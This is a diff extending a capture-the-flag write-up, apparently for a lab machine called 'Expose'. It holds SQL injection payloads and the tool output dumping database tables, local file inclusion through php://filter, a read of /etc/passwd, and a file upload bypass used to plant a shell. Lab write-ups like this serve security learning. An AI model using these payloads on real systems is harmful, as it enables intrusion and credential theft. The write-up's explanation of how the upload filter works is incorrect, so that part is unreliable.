@@ -155,7 +155,209 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 - Then, I tested for sql injection with the `ghauri` tool and was able to dump the data.
 
+```
+POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 54 HTTP(s) requests:
+---                                                                                                                                                 
+Parameter: email (POST)                                                                                                                             
+    Type: error-based                                                                                                                               
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)                                                  
+    Payload: email=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW&password=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW                                                                     
+                                                                                                                                                    
+    Type: time-based blind                                                                                                                          
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)                                                                                          
+    Payload: email='XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z&password='XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z                                     
+                                                                                                                                                    
+Parameter: password (POST)                                                                                                                          
+    Type: error-based                                                                                                                               
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)                                                  
+    Payload: email=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW&password=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW                                                                     
+                                                                                                                                                    
+    Type: time-based blind                                                                                                                          
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)                                                                                          
+    Payload: email='XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z&password='XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z                                     
+---                                                                                                                                                 
+there were multiple injection points, please select the one to use for following injections:
+[0] place: POST, parameter: email  (default)                                                                                                        
+[1] place: POST, parameter: password                                                                                                                
+[q] Quit                                                                                                                                            
+> 0                                                                                                                                                 
+
+[19:38:58] [INFO] testing MySQL
+[19:38:58] [INFO] confirming MySQL
+[19:38:58] [INFO] the back-end DBMS is MySQL
+[19:38:58] [WARNING] missing database parameter. Ghauri is going to use the current database to enumerate table(s) entries
+[19:38:58] [INFO] fetching current database
+[19:38:59] [INFO] retrieved: 'expose'
+current database: 'expose'
+[19:38:59] [INFO] fetching tables for database: expose
+[19:38:59] [INFO] fetching number of tables for database 'expose'
+[19:39:00] [INFO] retrieved: 2
+[19:39:02] [INFO] retrieved: config
+[19:39:02] [INFO] retrieved: user
+Database: expose
+[2 tables]
++--------+
+| user   |                                                                                                                                          
+| config |                                                                                                                                          
++--------+                                                                                                                                          
+[19:39:02] [INFO] fetching columns for table 'user' in database 'expose'
+[19:39:02] [INFO] fetching number of columns for table 'user' in database 'expose'
+[19:39:07] [INFO] retrieved: 4
+[19:39:08] [INFO] retrieved: created
+[19:39:08] [INFO] retrieved: email
+[19:39:09] [INFO] retrieved: id
+[19:39:09] [INFO] retrieved: password
+Database: expose
+Table: user
+[4 columns]
++----------+
+| created  |                                                                                                                                        
+| email    |                                                                                                                                        
+| id       |                                                                                                                                        
+| password |                                                                                                                                        
++----------+                                                                                                                                        
+[19:39:09] [INFO] fetching entries of column(s) 'created,email,id,password' for table 'user' in database 'expose'
+[19:39:09] [INFO] fetching number of column(s) 'created,email,id,password' entries for table 'user' in database 'expose'
+[19:39:10] [INFO] retrieved: 1
+[19:39:11] [INFO] retrieved: 2023-02-21 09:05:46
+[19:39:11] [INFO] retrieved: hacker@root.thm
+[19:39:12] [INFO] retrieved: 1
+[19:39:12] [INFO] retrieved: VeryDifficultPassword!!#@#@!#!@#1231
+Database: expose
+Table: user
+[1 entries]
++---------------------+-----------------+----+--------------------------------------+
+| created             | email           | id | password                             |                                                               
++---------------------+-----------------+----+--------------------------------------+                                                               
+| 2023-02-21 09:05:46 | hacker@root.thm | 1  | VeryDifficultPassword!!#@#@!#!@#1231 |                                                               
++---------------------+-----------------+----+--------------------------------------+                                                               
+[19:39:12] [INFO] table 'expose.user' dumped to CSV file '/home/sensei/.ghauri/10.10.125.91/dump/expose/user.csv'
+[19:39:12] [INFO] fetching columns for table 'config' in database 'expose'
+[19:39:12] [INFO] fetching number of columns for table 'config' in database 'expose'
+[19:39:13] [INFO] retrieved: 3
+[19:39:14] [INFO] retrieved: id
+[19:39:14] [INFO] retrieved: password
+[19:39:15] [INFO] retrieved: url
+Database: expose
+Table: config
+[3 columns]
++----------+
+| id       |                                                                                                                                        
+| password |                                                                                                                                        
+| url      |                                                                                                                                        
++----------+                                                                                                                                        
+[19:39:15] [INFO] fetching entries of column(s) 'id,password,url' for table 'config' in database 'expose'
+[19:39:15] [INFO] fetching number of column(s) 'id,password,url' entries for table 'config' in database 'expose'
+[19:39:15] [INFO] retrieved: 2
+[19:39:16] [INFO] retrieved: 1
+[19:39:17] [INFO] retrieved: 69c66901194a6486176e81f5945b8929
+[19:39:17] [INFO] retrieved: /file1010111/index.php
+[19:39:17] [INFO] retrieved: 3
+[19:39:18] [INFO] retrieved: // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z
+[19:39:25] [INFO] retrieved: /upload-cv00101011/index.php
+Database: expose
+Table: config
+[2 entries]
++----+-----------------------------------------------------+------------------------------+
+| id | password                                            | url                          |                                                         
++----+-----------------------------------------------------+------------------------------+                                                         
+| 1  | 69c66901194a6486176e81f5945b8929                    | /file1010111/index.php       |                                                         
+| 3  | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z | /upload-cv00101011/index.php |                                                         
++----+-----------------------------------------------------+------------------------------+                                                         
+[19:39:25] [INFO] table 'expose.config' dumped to CSV file '/home/sensei/.ghauri/10.10.125.91/dump/expose/config.csv'
+
+[19:39:25] [INFO] fetched data logged to text files under '/home/sensei/.ghauri/10.10.125.91'
+
+[*] ending @ 19:39:25 /2024-11-27/                                                                                                                  
+
+```
+
 - Important highlights are detailed in the pictures.The first pictures shows the password for the username which we don't need because it is a rabbit hole while the second picture shows urls and a password hash.
+
+![image](https://github.com/user-attachments/assets/3fac3837-06e3-4cba-8fc9-bffca9181192)
+
+![image](https://github.com/user-attachments/assets/50ce29f1-e1f1-4944-b7fc-70e3c3d63975)
+
+- I cracked the password hash with [crackstation](crackstation.net)
+
+![image](https://github.com/user-attachments/assets/3a662154-6c90-47df-9b7f-e4dc465eeadd)
+
+- The first url takes us to an admin panel and the cracked hash works for us.
+
+![image](https://github.com/user-attachments/assets/cdd7deb3-a08a-4f81-bef5-28d9d7496801)
+
+- I checked the password source and noticed a dev comment to use `file` and `view` as get parameters.
+
+![image](https://github.com/user-attachments/assets/e8756f2c-3170-4a94-b5c1-0617a43d678d)
+
+- The parameter `file` is vulnerable to `Local File Include`.I was able to read the `/etc/passwd` file
+
+![image](https://github.com/user-attachments/assets/a3c1106d-80fa-4ed0-968c-ca01432d5835)
+
+- After that discovery, I visited the other page which requires a username starting with `z`.
+
+![image](https://github.com/user-attachments/assets/b9aea4d4-db61-44d4-ad87-05855bf6af07)
+
+- Instead of bruteforcing,I dumped the content of that page in base64 using the `php://filter/convert.base64-encode/resource=` filter to see the source code.
+
+![image](https://github.com/user-attachments/assets/80f52c4c-6f46-4969-a780-6d2506cb0f06)
+
+- After checking the code,the username is `zeamkish`.
+
+```php
+ if ($password === 'zeamkish' AND !isset($_SESSION['validate_file'])){
+                $_SESSION['validate_file'] = true;
+```
+
+- In the source code, I noticed there is a filter for file uploaded to the server.
+
+```php
+function validate(){
+
+ var fileInput = document.getElementById('file');
+  var file = fileInput.files[0];
+  
+  if (file) {
+    var fileName = file.name;
+    var fileExtension = fileName.split('.').pop().toLowerCase();
+    
+    if (fileExtension === 'jpg' || fileExtension === 'png') {
+      // Valid file extension, proceed with file upload
+      // You can submit the form or perform further processing here
+      console.log('File uploaded successfully');
+          return true;
+    } else {
+      // Invalid file extension, display an error message or take appropriate action
+      console.log('Only JPG and PNG files are allowed');
+          return false;
+    }
+  }
+}
+```
+
+- The main sink is the `fileExtension` variable.The variable splits the string with delimeter `.` and deletes the last element of the array with `pop()`.It only picks the characters after the first dot.We can bypass this by simply naming our file `.jpg.php.
+
+```php
+var fileExtension = fileName.split('.').pop().toLowerCase();
+```
+
+- File upload bypassed
+
+![image](https://github.com/user-attachments/assets/a5ffb5de-0995-4eac-b100-69a928c35064)
+
+- I used the post parameter for the shell page because somehow the dev restricted the apache's server url which affects only the gat parameter.
+
+
+
+
+
+
+
+
+
+
 
 
 
